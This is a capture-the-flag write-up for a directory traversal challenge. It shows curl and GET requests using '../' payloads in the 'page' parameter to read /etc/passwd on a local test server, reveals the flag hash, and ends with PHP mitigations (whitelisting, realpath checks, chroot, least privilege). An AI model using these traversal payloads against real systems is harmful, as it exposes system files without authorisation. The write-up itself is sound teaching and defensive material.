curl "http://localhost:8080/?page=../../../../../../../../../../etc/passwd" | grep flag

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7014    0  7014    0     0  7627k      0 --:--:-- --:--:-- --<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script><!DOCTYPE HTML>
:--:-- 6849k
Directory Traversal Exploit Writeup

Overview

In this challenge, the web application reads a page query parameter and directly includes the corresponding file on the server. Improper validation allows an attacker to traverse directories (../) and access arbitrary files, including system files outside the web root.

Vulnerability

Parameter: page

Issue: The application concatenates user-supplied input into a file path without sanitization.

Result: An attacker can craft payloads like ../../../../etc/passwd to read sensitive files.

Enumeration and Proof of Concept

Base request (normal behavior):

GET /?page=home.php HTTP/1.1
Host: localhost:8080

Same-directory test:

GET /?page=./ HTTP/1.1

Returns the same content as home.php, proving ./ stays in place.

First-level traversal:

GET /?page=../ HTTP/1.1

Returns a special alert:

<script>alert('Nope..');</script>

Deeper traversal (e.g. four levels):

curl "$TARGET/?page=../../../../" | grep alert
# → <script>alert('Almost.');</script>

Full traversal to root:

curl "$TARGET/?page=../../../../../../../../../../" | grep alert
# → <script>alert('You can DO it !!!  :]');</script>

Reading /etc/passwd:

curl "$TARGET/?page=../../../../../../../../../../etc/passwd" | grep alert
# → <script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script>

Flag: b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

Mitigation

Input Validation & Whitelisting

Do not directly concatenate user input into file paths.

Maintain a whitelist of allowed page identifiers and map them to server-side files:

$pages = [
  'home'   => 'pages/home.php',
  'about'  => 'pages/about.php',
  // ...
];

$key = $_GET['page'];
if (!isset($pages[$key])) {
  // handle invalid page
}
include $pages[$key];

Filesystem Isolation

Run the webserver in a chroot jail or container so even using ../ can’t escape the restricted directory.

Path Normalization and Sanitization

Normalize user-supplied paths and reject any input containing .. segments before using them.

$path = realpath(__DIR__ . '/pages/' . $_GET['page'] . '.php');
if (strpos($path, __DIR__ . '/pages/') !== 0) {
  die('Invalid page');
}
include $path;

Least Privilege

Ensure the webserver filesystem user has only the minimum permissions necessary and cannot read sensitive system files.
